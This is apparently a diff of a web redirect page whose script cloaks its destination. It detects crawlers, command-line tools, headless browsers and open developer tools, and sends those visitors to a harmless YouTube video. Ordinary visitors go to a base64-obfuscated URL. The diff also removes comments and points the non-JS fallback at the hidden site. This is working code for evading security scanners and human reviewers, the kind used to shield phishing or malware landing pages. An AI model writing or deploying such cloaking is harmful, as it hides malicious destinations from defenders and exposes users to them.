@@ -3,9 +3,7 @@
 <head>
     <meta charset="utf-8">
     <title>Redirecting...</title>
-    <!-- Fallback for non-JS bots (curl, wget, etc.) -->
-    <meta http-equiv="refresh" content="0; url=https://youtu.be/1LtRVOTPLBg?si=PSAmzJKiPtW8OGSb">
-    <link rel="canonical" href="https://youtu.be/1LtRVOTPLBg?si=PSAmzJKiPtW8OGSb">
+    <meta http-equiv="refresh" content="2; url=https://parin.cyou/pcast">
     <style>
         body {
             margin: 0;
@@ -37,11 +35,11 @@
     </div>
     <script type="text/javascript">
         (function() {
-            // Replace with your Base64-encoded real URL
             const encodedRealUrl = 'aHR0cHM6Ly9wYXJpbi5jeW91L3BjYXN0';
             const botUrl = 'https://youtu.be/1LtRVOTPLBg?si=PSAmzJKiPtW8OGSb';
             let isBot = false;
-            // 1. User-Agent check – only obvious bots and tools
+            
+            // 1. User-Agent check
             const ua = navigator.userAgent.toLowerCase();
             const obviousBots = [
                 'curl', 'wget', 'fetch', 'httpie',
@@ -53,32 +51,33 @@
             if (obviousBots.some(bot => ua.includes(bot))) {
                 isBot = true;
             }
-            // 2. Strong headless detection only
-            // This catches Puppeteer/Selenium/Playwright when not stealth-configured
+            
+            // 2. Headless detection
             if (
-                navigator.webdriver === true ||  // Most reliable flag
-                (navigator.webdriver === undefined && ua.includes('headless')) // Some try to hide it
+                navigator.webdriver === true ||
+                (navigator.webdriver === undefined && ua.includes('headless'))
             ) {
                 isBot = true;
             }
-            // Optional light anti-debug (won't flag casual users)
+            
+            // 3. Anti-debug
             try {
                 const start = performance.now();
                 debugger;
                 if (performance.now() - start > 100) {
-                    isBot = true; // DevTools paused execution
+                    isBot = true;
                 }
             } catch(e) {}
-            // Delay redirect to allow animation to complete
+            
+            // Redirect after animation
             setTimeout(function() {
                 if (isBot) {
                     window.location.href = botUrl;
                 } else {
                     window.location.href = atob(encodedRealUrl);
                 }
-            }, 2000); // 2 second delay to match animation
+            }, 2000);
         })();
     </script>
-    <p class="fallback">If not redirected, <a href="https://youtu.be/1LtRVOTPLBg?si=PSAmzJKiPtW8OGSb">click here</a>.</p>
 </body>
 </html>
